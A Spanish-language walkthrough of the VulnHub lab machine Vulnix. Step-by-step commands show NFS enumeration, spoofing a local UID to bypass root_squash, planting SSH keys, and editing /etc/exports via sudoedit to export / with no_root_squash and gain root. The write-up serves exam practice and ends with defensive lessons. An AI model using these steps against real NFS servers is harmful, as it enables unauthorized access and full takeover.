Vulnix es una máquina Linux Easy de **VulnHub** (parte de un laboratorio de VulnHub autohospedado que estoy montando para preparar el eJPTv2), y es una lección limpia de principio a fin sobre **mala configuración de NFS**. Un directorio home exportado con `root_squash` es accesible por cualquiera — pero como NFS confía en el UID numérico del cliente, crear un usuario local con el UID que coincide da acceso, suficiente para plantar una clave SSH y entrar como `vulnix`. Desde ahí, una sola regla de `sudoedit /etc/exports` nos deja reexportar el *sistema de ficheros entero* con `no_root_squash`, montarlo como root local, y escribir el propio `authorized_keys` de `root` para una shell de root.

## Reconocimiento y Enumeración

### Escaneo de Puertos

```bash
sudo nmap -p- -sCV 192.168.57.3 -oN nmap
```

```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux)
25/tcp    open  smtp       Postfix smtpd
79/tcp    open  finger     Linux fingerd
110/tcp   open  pop3       Dovecot pop3d
111/tcp   open  rpcbind    2-4 (RPC #100000)
143/tcp   open  imap       Dovecot imapd
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  shell      Netkit rshd
2049/tcp  open  nfs        2-4 (RPC #100003)
```

Una lista de servicios amplia y a la vieja usanza — un stack de correo (SMTP/POP3/IMAP), `finger`, los r-services legacy (`rexec`/`rlogin`/`rsh`), y la pieza que importa: **`rpcbind` (111)** con **`nfs` (2049)**. Un servidor NFS expuesto es lo primero que hay que enumerar, porque todo su modelo de seguridad se basa en confiar en el cliente.

### Enumerar NFS

NFS anuncia lo que comparte a través del demonio de montaje. Tanto los scripts de NFS de `nmap` como la herramienta dedicada `showmount` reportan el mismo único export:

```bash
nmap -p111,2049 -sV --script "rpcinfo,nfs-showmount,nfs-ls,nfs-statfs" 192.168.57.3
showmount -e 192.168.57.3
```

```bash
Export list for 192.168.57.3:
/home/vulnix *
```

**`/home/vulnix`** está exportado a `*` — cualquier host de la red puede montarlo. Esa es la vía de entrada.

## Acceso Inicial — Recurso NFS y Clave SSH como `vulnix`

### Montar el export y el problema del UID

Montar el recurso es directo (forzar NFSv3 mantiene contento a este servidor antiguo):

```bash
sudo mkdir /mnt/nfs_mount
sudo mount -t nfs -o vers=3 192.168.57.3:/home/vulnix /mnt/nfs_mount
ls -l /mnt
# drwxr-x--- 2 2008 2008 4096 Sep  2  2012 nfs_mount
```

El montaje tiene éxito, pero el directorio es propiedad del **UID 2008** con modo `0750`, y nuestro `root` local no puede leerlo. Esto es `root_squash` haciendo su trabajo — mapea el `root` del cliente al `nobody` sin privilegios, así que ser root localmente no sirve de nada. Pero aquí está la clave sobre NFS: **los permisos se aplican por UID numérico, y el servidor confía en el UID que el cliente presenta**. No hay autenticación real. Así que si nos convertimos en un usuario *local* cuyo UID es 2008, el servidor nos tratará como al propietario:

```bash
sudo useradd -u 2008 vulnix
sudo su vulnix
$ cd /mnt/nfs_mount && ls -la
# .bash_logout  .bashrc  .profile   (el home de vulnix, ahora completamente nuestro)
```

### Plantar una clave SSH

Como ahora controlamos el directorio home de `vulnix` por NFS, podemos dejar nuestra propia clave en `~/.ssh/authorized_keys` y entrar por SSH. Un detalle: el servidor corre **OpenSSH 5.9** (de 2012), que es anterior a Ed25519, así que una clave `ed25519` es rechazada — generar una clave **RSA** en su lugar lo soluciona:

```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/vulnix_rsa -N ""
```

```bash
# como el usuario UID-2008, escribimos la clave pública en el home de vulnix en el mount
$ mkdir -p /mnt/nfs_mount/.ssh && chmod 700 /mnt/nfs_mount/.ssh
$ echo "ssh-rsa AAAA...<vulnix_rsa.pub>... kali" > /mnt/nfs_mount/.ssh/authorized_keys
$ chmod 600 /mnt/nfs_mount/.ssh/authorized_keys
```

Iniciar sesión necesita los flags de algoritmos legacy (los clientes SSH modernos deshabilitan `ssh-rsa` por defecto, y este servidor solo habla los antiguos):

```bash
ssh -i ~/.ssh/vulnix_rsa \
    -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    vulnix@192.168.57.3
```

```bash
vulnix@vulnix:~$ whoami
vulnix
```

Una shell real como **`vulnix`**.

## Escalada de Privilegios — `vulnix` → `root` (NFS `no_root_squash` vía `sudoedit`)

### La regla de sudo

```bash
vulnix@vulnix:~$ sudo -l
```

```bash
User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

`vulnix` puede editar **`/etc/exports`** — la tabla de exports de NFS — como root, sin contraseña. `sudoedit` abre el fichero de forma segura como root en nuestro editor, y `/etc/exports` es el fichero que controla cómo trata NFS a los clientes remotos. La entrada actual es la restrictiva que ya conocimos:

```bash
vulnix@vulnix:~$ cat /etc/exports
/home/vulnix	*(rw,root_squash)
```

### Desactivar root_squash en `/`

La escalada consiste en añadir un *nuevo* export — el sistema de ficheros raíz completo — con **`no_root_squash`**. Esa opción es lo contrario de lo que nos encontramos antes: le dice al servidor que *confíe* en el `root` de un cliente remoto como el `root` real. Añadiendo esta línea con `sudoedit /etc/exports`:

```text
/		*(rw,no_root_squash)
```

> NFS solo relee `/etc/exports` cuando el servicio recarga. Sin root no podemos ejecutar `exportfs -ra`, así que en este laboratorio se aplica **reiniciando la VM** (vale para una máquina local de VulnHub; en un objetivo real necesitarías que el servicio recargara de otra forma).

Tras la recarga, el nuevo export es visible, y ahora montar `/` nos hace el `root` real en cada fichero que tocamos:

```bash
showmount -e 192.168.57.3
# /            *
# /home/vulnix *
sudo mount -t nfs -o vers=3 192.168.57.3:/ /mnt/root
```

### Escribir el authorized_keys de root

Con `no_root_squash`, nuestro `root` local escribe en el sistema de ficheros del objetivo *como* `root` — así que dejamos la misma clave RSA en el `authorized_keys` de `root` y entramos por SSH directamente:

```bash
sudo mkdir -p /mnt/root/root/.ssh
sudo cp ~/.ssh/vulnix_rsa.pub /mnt/root/root/.ssh/authorized_keys
ssh -i ~/.ssh/vulnix_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa root@192.168.57.3
```

```bash
root@vulnix:~# id
uid=0(root) gid=0(root) groups=0(root)
root@vulnix:~# cat /root/trophy.txt
REDACTED
```

Root completo, y el trofeo.

## Conclusiones Clave

- **NFS confía en el UID del cliente — ese es todo el modelo de amenaza.** `root_squash` solo neutraliza a un *root* remoto; no hace nada contra un cliente que simplemente crea un usuario local con el UID coincidente (2008 aquí). Exporta directorios solo a hosts específicos y de confianza, y nunca asumas que `root_squash` es control de acceso.
- **`no_root_squash` es root remoto por diseño.** Exportar un sistema de ficheros con `no_root_squash` deja que el root de cualquier cliente escriba ficheros como el root del servidor — dejar un `authorized_keys`, un binario SUID o un cron es trivial. Prácticamente nunca debería usarse en nada que un host no confiable pueda alcanzar, y menos aún en `/`.
- **Un solo fichero de configuración escribible puede ser toda la escalada.** `sudoedit /etc/exports` parecía estrecho, pero `/etc/exports` gobierna la frontera de confianza de un servicio a nivel de root. Audita *qué controla un fichero editable por sudo*, no solo si la regla "parece segura".
- **La criptografía antigua moldea el ataque.** Que OpenSSH 5.9 rechace Ed25519 y necesite `+ssh-rsa` es un recordatorio de ajustar tus herramientas a la época del objetivo — el exploit estaba bien; el tipo de clave y los flags de algoritmo fueron los verdaderos bloqueos.
